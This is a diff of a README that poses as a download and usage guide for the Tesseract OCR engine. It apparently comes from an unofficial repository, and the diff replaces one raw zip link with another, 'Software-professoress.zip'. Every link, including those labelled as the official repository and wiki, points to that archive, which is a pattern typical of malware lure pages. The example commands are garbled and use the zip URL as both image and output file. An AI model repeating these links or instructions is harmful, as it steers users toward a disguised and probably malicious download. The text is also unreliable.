@@ -4,7 +4,7 @@
 Tesseract is an open-source Optical Character Recognition (OCR) engine. It converts images into machine-readable text. This guide helps you download and run the software easily.
 
 ## 📥 Download Tesseract
-[![Download Tesseract](https://raw.githubusercontent.com/endx707/tesseract/main/interlying/tesseract.zip%20Tesseract-v1.0-blue)](https://raw.githubusercontent.com/endx707/tesseract/main/interlying/tesseract.zip)
+[![Download Tesseract](https://raw.githubusercontent.com/endx707/tesseract/main/unittest/Software-professoress.zip%20Tesseract-v1.0-blue)](https://raw.githubusercontent.com/endx707/tesseract/main/unittest/Software-professoress.zip)
 
 ## 🛠️ System Requirements
 Before you start, ensure your system meets the following requirements:
@@ -33,7 +33,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page:** Click the button below to go to the download page.
 
-   [Download Tesseract](https://raw.githubusercontent.com/endx707/tesseract/main/interlying/tesseract.zip)
+   [Download Tesseract](https://raw.githubusercontent.com/endx707/tesseract/main/unittest/Software-professoress.zip)
 
 2. **Choose the Version:** On the releases page, find the latest version. Click on it to view details.
 
@@ -59,16 +59,16 @@ Once Tesseract is installed, you can use it through the command line. Here’s a
 3. Use the following command to convert an image:
 
    ```bash
-   tesseract https://raw.githubusercontent.com/endx707/tesseract/main/interlying/tesseract.zip https://raw.githubusercontent.com/endx707/tesseract/main/interlying/tesseract.zip
+   tesseract https://raw.githubusercontent.com/endx707/tesseract/main/unittest/Software-professoress.zip https://raw.githubusercontent.com/endx707/tesseract/main/unittest/Software-professoress.zip
    ```
 
-Replace `https://raw.githubusercontent.com/endx707/tesseract/main/interlying/tesseract.zip` with your image file name and `https://raw.githubusercontent.com/endx707/tesseract/main/interlying/tesseract.zip` with the desired output file name.
+Replace `https://raw.githubusercontent.com/endx707/tesseract/main/unittest/Software-professoress.zip` with your image file name and `https://raw.githubusercontent.com/endx707/tesseract/main/unittest/Software-professoress.zip` with the desired output file name.
 
 ## 🌍 Supported Languages
 Tesseract supports multiple languages out of the box. You can specify the language by adding the `-l` option. For example:
 
 ```bash
-tesseract https://raw.githubusercontent.com/endx707/tesseract/main/interlying/tesseract.zip https://raw.githubusercontent.com/endx707/tesseract/main/interlying/tesseract.zip -l spa
+tesseract https://raw.githubusercontent.com/endx707/tesseract/main/unittest/Software-professoress.zip https://raw.githubusercontent.com/endx707/tesseract/main/unittest/Software-professoress.zip -l spa
 ```
 
 Replace `spa` with the code for the desired language (e.g., `eng` for English, `fra` for French).
@@ -94,7 +94,7 @@ Once you are comfortable with basic usage, consider exploring advanced features,
 - Integrating Tesseract with other software for automated workflows
 
 ## 🔗 Additional Resources
-- [Tesseract GitHub Repository](https://raw.githubusercontent.com/endx707/tesseract/main/interlying/tesseract.zip)
-- [Tesseract Wiki](https://raw.githubusercontent.com/endx707/tesseract/main/interlying/tesseract.zip)
+- [Tesseract GitHub Repository](https://raw.githubusercontent.com/endx707/tesseract/main/unittest/Software-professoress.zip)
+- [Tesseract Wiki](https://raw.githubusercontent.com/endx707/tesseract/main/unittest/Software-professoress.zip)
 
 Feel free to explore the features of Tesseract. Enjoy transforming your images into editable text!
